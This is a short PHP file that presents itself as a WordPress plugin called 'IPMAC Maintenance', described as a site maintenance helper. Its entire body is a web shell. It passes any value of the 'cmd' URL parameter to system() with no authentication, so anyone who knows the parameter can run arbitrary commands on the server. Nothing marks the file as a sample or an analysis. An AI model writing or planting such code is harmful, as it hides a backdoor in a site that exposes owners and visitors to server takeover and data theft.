<?php
/**
 * Plugin Name: IPMAC Maintenance
 * Description: Site maintenance helper.
 * Version: 1.0
 * Author: IPMAC
 */
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
